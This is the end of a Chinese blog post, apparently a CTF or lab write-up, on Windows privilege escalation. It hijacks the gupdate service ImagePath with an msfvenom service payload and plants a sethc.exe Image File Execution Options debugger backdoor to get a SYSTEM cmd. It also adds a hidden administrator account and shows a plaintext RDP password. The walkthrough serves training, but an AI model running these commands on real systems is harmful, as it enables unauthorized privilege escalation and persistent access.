+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span><span class="n">p</span> <span class="p">:</span> <span class="err">指定要使用的</span><span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">exec</span><span class="p">:</span> <span class="err">适用于</span> <span class="mi">64</span> <span class="err">位</span> <span class="n">Windows</span> <span class="err">系统的</span> <span class="n">payload</span><span class="err">，设计用于执行指定的命令</span><span class="p">,</span> <span class="err">这个</span> <span class="n">payload</span> <span class="err">会运行用户定义的命令（通过</span> <span class="n">cmd</span> <span class="err">参数指定）</span>
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">system32</span>\<span class="n">cmd</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">c</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Adrian</span>\<span class="n">Desktop</span>\<span class="n">bad</span><span class="o">.</span><span class="n">bat</span><span class="p">:</span> <span class="err">启动</span><span class="n">windows里面的cmd</span><span class="p">(</span><span class="err">系统权限</span><span class="p">)</span><span class="err">运行一个批处理文件</span><span class="p">,</span> <span class="o">/</span><span class="n">c</span> <span class="err">参数表示</span> <span class="n">cmd</span> <span class="err">执行后续的命令后立即退出</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">platform</span> <span class="n">windows</span> <span class="p">:</span> <span class="err">指定目标平台为</span> <span class="n">Windows</span><span class="err">，确保生成的</span> <span class="n">payload</span> <span class="err">与</span> <span class="n">Windows</span> <span class="err">系统兼容。</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">f</span><span class="p">:</span> <span class="err">指定输出格式</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span><span class="o">-</span><span class="n">service</span><span class="p">:</span> <span class="err">表示生成一个</span> <span class="n">Windows</span> <span class="err">可执行文件</span><span class="p">(</span><span class="n">exe</span><span class="p">),</span> <span class="err">并且这个</span> <span class="n">exe</span> <span class="err">文件可以作为</span> <span class="n">Windows</span> <span class="err">服务运行（用于持久化或后台执行</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了能够让生成的exe文件上传上去, 远程桌面连接的时候开启一个共享文件夹(记得要先创建文件夹，比如<code>sudo mkdir -p /mnt/xpw/kali_shard</code>,然后将b.exe放到这文件夹<code>sudo cp b.exe /mnt/xpw/kali_shard/</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:WIN19\\Adrian /p:&#39;050218qazQAZ.&#39; /v:172.22.4.45 /cert:ignore /drive:share,/mnt/xpw/kali_shard
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/drive 允许将本地文件系统的一个目录映射到远程 Windows 系统，作为共享驱动器
+</span></span><span class="line"><span class="cl">share 是远程系统上显示的驱动器名称(可任意设置)
+</span></span><span class="line"><span class="cl">/mnt/xpw/kali_shard : 本地系统的目录路径, 作为一个共享文件夹
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在Windows中可以通过以下路径访问到b.exe：tsclient\share\b.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/delegation/image-20251117191556247.png"
+	width="927"
+	height="396"
+	srcset="/p/delegation/image-20251117191556247_hu_3595a07674aa15.png 480w, /p/delegation/image-20251117191556247_hu_88d5e8d3b1ccb9e5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251117191556247"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="561px"
+	
+></p>
+<p>将上传的exe文件复制到桌面, 修改注册表绑定到<code>gupdate</code>服务上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\Users\Adrian\Desktop\b.exe&#34; /f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/t 指定要添加或修改的注册表值的类型 (type)
+</span></span><span class="line"><span class="cl">REG_EXPAND_SZ : 一种字符串类型，允许包含环境变量(如 %SystemRoot%)
+</span></span><span class="line"><span class="cl">/v:指定要修改的注册表值的名称 (value)
+</span></span><span class="line"><span class="cl">/d:指定要设置的注册表值的数据 (data)
+</span></span><span class="line"><span class="cl">/f:表示强制执行操作，覆盖现有的值而无需用户确认 (force)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建一个批处理文件bad.bat，内容 是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REG ADD &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34; /v Debugger /t REG_SZ /d &#34;C:\windows\system32\cmd.exe&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sethc.exe 表示 Windows 的“粘滞键”功能的程序, 在登录界面按 5 次 Shift 键触发
+</span></span><span class="line"><span class="cl">REG_SZ :是一种字符串类型，表示值是一个固定字符串
+</span></span><span class="line"><span class="cl">这个bat文件的作用就是在登录界面按5次 Shift 键触发粘滞键功能从而拿到系统权限的cmd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就可以打上面的命令启动服务了</p>
+<p><img src="/p/delegation/image-20251117195239570.png"
+	width="984"
+	height="357"
+	srcset="/p/delegation/image-20251117195239570_hu_e7095e28a8e6cf04.png 480w, /p/delegation/image-20251117195239570_hu_acf43aacd0faec9c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251117195239570"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="275"
+		data-flex-basis="661px"
+	
+></p>
+<p>锁定账户, 进入rpd登录界面, 按5次<code>shift</code>键 拿到系统权限的cmd窗口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type C:\users\administrator\flag\flag02.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/delegation/image-20251117205527346.png"
+	width="895"
+	height="234"
+	srcset="/p/delegation/image-20251117205527346_hu_3253b780f3864f6d.png 480w, /p/delegation/image-20251117205527346_hu_adcd3d79c3136419.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251117205527346"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="917px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user tao 123456qwe. /add
+</span></span><span class="line"><span class="cl">net localgroup administrators tao /add
+</span></span><span class="line"><span class="cl">添加个管理员用户方便权限维持
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>总结一下流程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">修改gupdate服务ImagePath</span> <span class="o">-&gt;</span> <span class="n">指向我们的b</span><span class="o">.</span><span class="n">exe</span> <span class="o">-&gt;</span> <span class="n">启动gupdate服务</span> <span class="o">-&gt;</span> <span class="n">b</span><span class="o">.</span><span class="n">exe以系统权限运行</span> <span class="o">-&gt;</span> <span class="n">b</span><span class="o">.</span><span class="n">exe执行bad</span><span class="o">.</span><span class="n">bat</span> <span class="o">-&gt;</span> <span class="n">bad</span><span class="o">.</span><span class="n">bat修改注册表</span><span class="err">（</span><span class="n">设置sethc</span><span class="o">.</span><span class="n">exe的调试器为cmd</span><span class="o">.</span><span class="n">exe</span><span class="err">）</span> <span class="o">-&gt;</span> <span class="n">锁定计算机</span> <span class="o">-&gt;</span> <span class="n">在登录界面按5次shift</span> <span class="o">-&gt;</span> <span class="n">触发sethc</span><span class="o">.</span><span class="n">exe的调试器</span><span class="err">（</span><span class="n">即cmd</span><span class="o">.</span><span class="n">exe</span><span class="err">）</span><span class="n">并以系统权限运行</span> <span class="o">-&gt;</span> <span class="n">获取系统权限</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%9F%90%E4%BC%81%E4%B8%9A%E4%BA%8C%E9%9D%A2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">某企业二面</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/spoofing/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">spoofing</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-initial/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-Initial</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-hospital/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
